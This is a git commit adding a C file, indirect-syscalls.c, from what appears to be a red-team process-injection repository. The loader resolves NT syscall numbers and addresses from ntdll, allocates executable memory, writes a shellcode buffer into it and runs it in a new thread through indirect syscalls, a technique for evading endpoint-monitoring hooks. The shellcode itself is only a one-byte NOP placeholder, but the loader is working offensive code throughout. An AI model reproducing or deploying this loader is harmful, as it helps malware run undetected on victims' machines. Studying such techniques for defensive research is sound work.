833013e712c66960a386e8e9a2d96724f8c54b3a
Jonas Wittmann <91656629+j0wittmann@users.noreply.github.com>
2026-02-20 17:55:29 +0100

    add indirect-syscalls.c

---
+++ process-injection/Indirect-Syscalls/indirect-syscalls.c
@@ -0,0 +1,48 @@
+#include <windows.h>  
+#include "syscalls.h"
+
+// shellcode
+unsigned char buf[] = { 0x90 };
+
+DWORD wNtAllocateVirtualMemory;
+UINT_PTR sysAddrNtAllocateVirtualMemory;
+DWORD wNtWriteVirtualMemory;
+UINT_PTR sysAddrNtWriteVirtualMemory;
+DWORD wNtCreateThreadEx;
+UINT_PTR sysAddrNtCreateThreadEx;
+DWORD wNtWaitForSingleObject;
+UINT_PTR sysAddrNtWaitForSingleObject;
+
+int main() {
+    PVOID allocBuffer = NULL;
+    SIZE_T buffSize = sizeof(buf);
+
+    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
+
+    UINT_PTR pNtAllocateVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    wNtAllocateVirtualMemory = ((unsigned char*)(pNtAllocateVirtualMemory + 4))[0];
+    sysAddrNtAllocateVirtualMemory = pNtAllocateVirtualMemory + 0x12;
+
+    UINT_PTR pNtWriteVirtualMemory = (UINT_PTR)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    wNtWriteVirtualMemory = ((unsigned char*)(pNtWriteVirtualMemory + 4))[0];
+    sysAddrNtWriteVirtualMemory = pNtWriteVirtualMemory + 0x12;
+
+    UINT_PTR pNtCreateThreadEx = (UINT_PTR)GetProcAddress(hNtdll, "NtCreateThreadEx");
+    wNtCreateThreadEx = ((unsigned char*)(pNtCreateThreadEx + 4))[0];
+    sysAddrNtCreateThreadEx = pNtCreateThreadEx + 0x12;
+
+    UINT_PTR pNtWaitForSingleObject = (UINT_PTR)GetProcAddress(hNtdll, "NtWaitForSingleObject");
+    wNtWaitForSingleObject = ((unsigned char*)(pNtWaitForSingleObject + 4))[0];
+    sysAddrNtWaitForSingleObject = pNtWaitForSingleObject + 0x12;
+
+    NtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&allocBuffer, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
+
+    ULONG bytesWritten;
+    NtWriteVirtualMemory(GetCurrentProcess(), allocBuffer, buf, buffSize, &bytesWritten);
+    HANDLE hThread;
+    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
+
+    NtWaitForSingleObject(hThread, FALSE, NULL);
+
+    return 0;
+}
